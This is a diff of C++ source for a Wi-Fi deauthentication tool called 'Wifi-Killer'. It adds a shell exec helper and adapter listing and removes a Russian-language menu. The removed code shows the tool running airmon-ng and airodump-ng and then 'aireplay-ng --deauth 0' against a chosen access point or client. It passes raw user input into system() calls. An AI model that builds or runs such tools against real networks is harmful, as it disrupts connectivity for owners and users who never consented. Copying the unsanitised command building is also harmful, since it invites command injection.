@@ -1,9 +1,29 @@
 #include <iostream>
-#include <stdlib.h>
 #include <unistd.h>
+#include <stdexcept>
+#include <stdio.h>
+#include <vector>
 
 using namespace std;
-int wifi( string adapter ) {
+
+string exec(string command) {
+	char buffer[128];
+	string result = "";
+	FILE* pipe = popen(command.c_str(), "r");
+	if (!pipe) throw runtime_error("popen() failed!");
+	try {
+		while ( fgets(buffer, sizeof(buffer), pipe) != NULL ) {
+			result += buffer;
+		}
+	} catch (...) {
+		pclose(pipe);
+		throw;
+	}
+	pclose(pipe);
+	return result;
+}
+
+int wifi(string adapter) {
 	string bssid, ch, bssid2;
 	int varr = 0;
 	
@@ -56,56 +76,6 @@ int wifi( string adapter ) {
 	return 0;
 }
 
-int ruwifi(string adapter){
-	string bssid, ch, bssid2;
-	int varr = 0;
-	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
-	cout << "\n1-Сканировать сети\n2-Отключить точку доступа\n3-Отключить клиента\n4-Выход\nWK>";
-	cin  >> varr;
-	if ( varr == 4 ) {
-		system("clear");
-		cout << "Выход...\n";
-		system(("airmon-ng stop " + adapter +"mon").c_str());
-		system("service network-manager start");
-		return 0;
-	} else if ( varr == 1 ) {
-		system(("airodump-ng " + adapter + "mon").c_str());
-		ruwifi(adapter);
-	} else if ( varr == 2 ) {
-		system("clear");
-		system(("airodump-ng " + adapter + "mon").c_str());
-		cout << "Введите BSSID ТД\nWK>";
-		cin  >> bssid;
-		cout << "Введите канал на котором находится ТД\nWK>";
-		cin  >> ch;
-		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
-		system("clear");
-		cout << "Атака начата\n";
-		sleep(3);
-		system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
-		system("clear");
-		ruwifi(adapter);
-	} else if ( varr == 3 ) {
-		system(("airodump-ng " + adapter + "mon").c_str());
-		cout << "Введите BSSID ТД для сканирования\nWK>";
-		cin  >> bssid;
-		cout << "Введите канал на котором находится ТД\nWK>";
-		cin  >> ch;
-		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
-		cout << "Введите станцию\nWK>";
-		cin  >> bssid2;
-		system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
-		system("clear");
-		ruwifi(adapter);
-	} else {
-		cout<<"ERROR\n";
-		sleep(3);
-		system("clear");
-		ruwifi(adapter);
-	}
-	return 0;	
-}
-
 void clear() {
 	std::cout << "\x1B[2J\x1B[H";
 }
@@ -114,64 +84,53 @@ void showLogo() {
 	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
 }
 
-int chooseLang() {
-	int lang = 0;
-	cout << "Language?" << endl;
-	cout << "1-English" <<endl;
-	cout << "2-Russian\nWK> ";
-	cin  >> lang;
-	return lang;
-}
-
 bool checkRoot() {
 	return getuid() ? false : true;
 }
 
-int main (int argc, char** argv) {
-	int lang = 0;
+vector<string> split(const string& str, const string& delim)
+{
+    vector<string> tokens;
+    size_t prev = 0, pos = 0;
+    do
+    {
+        pos = str.find(delim, prev);
+        if (pos == string::npos) pos = str.length();
+        string token = str.substr(prev, pos-prev);
+        if (!token.empty()) tokens.push_back(token);
+        prev = pos + delim.length();
+    }
+    while (pos < str.length() && prev < str.length());
+    return tokens;
+}
+
+vector<string> getNetworkDevices() {
+	string ipLinkResult = exec("ip link show | awk --field-separator=': ' '{print $2}' | awk 'NF > 0' | tr '\n' ' '");
+	return split(ipLinkResult, " ");
+}
+
+int main(int argc, char** argv) {
 	string adapter;
+	
 	if ( checkRoot() ) {
 		showLogo();
-		lang = chooseLang();
+		clear();
+		showLogo();
+		system("airmon-ng check kill");
+		system("iwconfig");
 
-		if ( lang == 1 ) {
-			clear();
-			showLogo();
-			system("airmon-ng check kill");
-			system("iwconfig");
+		cout << "\nEnter name of adapter(wlan0, etc.)\nWK>";
+		cin  >> adapter;
 
-			cout << "\nEnter name of adapter(wlan0, etc.)\nWK>";
-			cin  >> adapter;
+		system(("airmon-ng start " + adapter).c_str());
+		system("clear");
 
-			system(("airmon-ng start " + adapter).c_str());
-			system("clear");
+		wifi(adapter);
 
-			wifi(adapter);
-
-			return 0;
-		} else if ( lang == 2 ) {
-			system("airmon-ng check kill");
-			system("clear");
-			system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
-			system("iwconfig");
-
-			cout << "\nВведите имя адаптера(wlan0, и т.д.)\nWK>";
-			cin  >> adapter;
-
-			system(("airmon-ng start " + adapter).c_str());
-			system("clear");
-
-			ruwifi(adapter);
-
-			return 0;
-		} else {
-			cout << "ERROR\n";
-			sleep(3);
-			main(1, nullptr);
-		}
+		return 0;
 	} else {
 		cout << "Error!\n";
 		cout << "Run wifi killer with sudo " << endl;
-		return 0;
+		return 1;
 	}
 }
